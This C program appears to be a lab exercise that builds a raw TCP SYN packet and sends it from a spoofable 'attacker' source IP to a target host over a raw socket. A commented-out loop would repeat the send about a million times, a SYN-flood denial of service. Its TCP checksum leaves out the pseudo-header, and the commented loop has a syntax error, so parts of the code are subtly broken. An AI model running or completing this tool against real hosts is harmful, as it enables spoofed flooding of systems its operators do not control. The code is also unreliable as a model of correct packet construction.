#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>


#define SRC_PORT 40508
#define DEST_PORT 40508
#define PACKET_SIZE 4096

// Calculate the checksum value of the IP header and TCP header
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char * ) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short) ~sum;

    return (answer);
}

int main(int argc, char *argv[]){
    int sock;
    struct sockaddr_in server_addr;
    char buff[PACKET_SIZE];

    if (argc != 3) {
        printf("Incorrect number of arguments - only need two (source_ip destination_ip)\n");
        exit(0);
    }

    char* attacker_ip;
    char* target_ip;
    attacker_ip = argv[1];
    target_ip = argv[2];

    printf("The input is %s %s\n", attacker_ip, target_ip);

    // CREATING THE SERVER SOCKET
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0){
        perror("Error in socket");
        exit(0);
    }

    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    // Create the IP header
    struct iphdr iphdr;
    memset(&iphdr, 0, sizeof(iphdr));
    iphdr.ihl = 5;
    iphdr.version = 4;
    iphdr.tos = 0;
    iphdr.tot_len = htons(sizeof(iphdr) + sizeof(struct tcphdr));
    iphdr.id = htons(1234);
    iphdr.ttl = 64;
    iphdr.protocol = IPPROTO_TCP;
    iphdr.saddr = inet_addr(attacker_ip);
    iphdr.daddr = inet_addr(target_ip);

    // Create the TCP header
    struct tcphdr tcphdr;
    memset(&tcphdr, 0, sizeof(tcphdr));
    tcphdr.source = htons(SRC_PORT);
    tcphdr.dest = htons(DEST_PORT);
    tcphdr.seq = htonl(1234);
    tcphdr.doff = 5;
    tcphdr.syn = 1;
    tcphdr.window = htons(65535);


    // clear buffer
    memset(buff, 0, PACKET_SIZE);

    // SET THE SERVER IP AND PORT
    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(DEST_PORT);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    iphdr.daddr = server_addr.sin_addr.s_addr;

    // Calculate the checksum for the IP header
    iphdr.check = csum((unsigned short *)&iphdr, sizeof(iphdr));

    // Calculate the checksum for the TCP header
    tcphdr.check = csum((unsigned short *)&tcphdr, sizeof(tcphdr));

//    for(int i = 0; i < 100; i++){
//        for(int j = 0; j < 10000; j++){
//            int err = sendto(sock, buff, sizeof(struct iphdr), 0, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)));
//            if(err < 0){
//                perror("error in sending the syn packet!");
//            }
//        }
//    }

    // combine the IP header and TCP header into the buffer
    memcpy(buff, &iphdr, sizeof(iphdr));
    memcpy(buff + sizeof(iphdr), &tcphdr, sizeof(tcphdr));

    int err = sendto(sock, buff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if(err < 0){
        perror("error in sending the syn packet!");
    }

}